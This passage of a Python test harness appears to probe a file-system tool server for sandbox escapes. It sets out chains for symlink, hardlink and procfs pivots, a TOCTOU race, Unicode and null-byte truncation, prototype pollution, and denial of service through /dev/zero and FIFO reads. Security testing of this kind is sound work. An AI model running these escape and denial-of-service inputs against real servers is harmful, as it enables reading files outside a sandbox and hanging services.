        StepCall("C14", 7, "", "read_file", "{SANDBOX}/readme.txt",
                 extra_args={"__proto__": {"polluted": True}},
                 label="prototype pollution extra arg"),
        StepCall("C14", 8, "", "read_file", "a" * (1024 * 1024),
                 label="1 MB path string"),
    ]


# ---- C15: Resource exhaustion --------------------------------------------

def setup_c15(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    wsl_bash(f"""
        set -e
        ln -sf /dev/zero {sandbox}/zero_link
        mkfifo {sandbox}/fifo_link 2>/dev/null || true
    """)


def calls_c15() -> list[StepCall]:
    return [
        StepCall("C15", 1, "ln -s /dev/zero {SANDBOX}/zero_link",
                 "read_file", "{SANDBOX}/zero_link",
                 label="/dev/zero via symlink — DoS"),
        StepCall("C15", 2, "mkfifo {SANDBOX}/fifo_link",
                 "read_file", "{SANDBOX}/fifo_link",
                 label="FIFO read — hang DoS"),
        StepCall("C15", 3, "", "read_file", "{SANDBOX}/" + "a" * 4000 + ".txt",
                 label="PATH_MAX-length path"),
        StepCall("C15", 4, "", "list_directory",
                 "{SANDBOX}/" + "/".join(["x"] * 200),
                 label="200-segment deep non-existent path"),
    ]


# ---- Chain registry ------------------------------------------------------

CHAINS: list[Chain] = [
    Chain("C1", "Prefix confusion",
          "Allow-list check uses startsWith without trailing slash.",
          setup_c1, calls_c1),
    Chain("C2", "Symlink plant → read",
          "Server follows externally-planted symlinks to targets outside sandbox.",
          setup_c2, calls_c2),
    Chain("C3", "Symlink chain",
          "Realpath walks multi-hop symlink chains.",
          setup_c3, calls_c3),
    Chain("C4", "Symlink loop DoS",
          "A→B, B→A loop causes hang or ELOOP.",
          setup_c4, calls_c4),
    Chain("C5", "Dangling symlink info leak",
          "Broken symlink's error message echoes the target path.",
          setup_c5, calls_c5),
    Chain("C6", "Dir-symlink nested read",
          "sandbox/link→victim dir; read files under it.",
          setup_c6, calls_c6),
    Chain("C7", "Parent-dir symlink",
          "Server may not realpath the path against allowed-dir realpath.",
          setup_c7, calls_c7),
    Chain("C8", "Hardlink escape",
          "Realpath cannot detect hardlinks; file inside sandbox aliases canary inode.",
          setup_c8, calls_c8),
    Chain("C9", "TOCTOU race",
          "Swap race_target between file and symlink while hammering read_file.",
          setup_c9, calls_c9),
    Chain("C10", "Procfs pivot",
          "Escape via /proc/self/root, /proc/self/cwd, /proc/1/root.",
          setup_c10, calls_c10),
    Chain("C11", "Unicode normalization",
          "NFC ≠ NFD; fullwidth; RTL override — parser vs kernel mismatch.",
          setup_c11, calls_c11),
    Chain("C12", "Null-byte / control-char truncation",
          "C-string vs JS-string mismatch in path handling.",
          setup_c12, calls_c12),
    Chain("C13", "CVE-53110 mutation family",
          "Does the patch catch only the literal `....//` pattern?",
          setup_c13, calls_c13),
    Chain("C14", "Type confusion / JSON-RPC smuggling",
          "Non-string path, prototype pollution, 1 MB string.",
          setup_c14, calls_c14),
    Chain("C15", "Resource exhaustion",
          "/dev/zero, FIFO hang, PATH_MAX, deep path.",
          setup_c15, calls_c15),
]


def run_chains_phase(chains: list[Chain]) -> list[StepResult]:
    print(f"\n[Phase 3] Attack chains ({len(chains)})")
    all_results: list[StepResult] = []
    for chain in chains:
        print(f"\n  {chain.chain_id} — {chain.name}")
        for v in SANDBOXES:
            chain.setup(v)
        if chain.chain_id == "C9":
            with swap_loop("328"), swap_loop("729"):
                all_results.extend(run_calls_both_versions(chain.calls()))
        else:
            all_results.extend(run_calls_both_versions(chain.calls()))
    return all_results


def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    print("attack_fs_chains.py — scaffold OK (no phases implemented yet)")


if __name__ == "__main__":
    main()
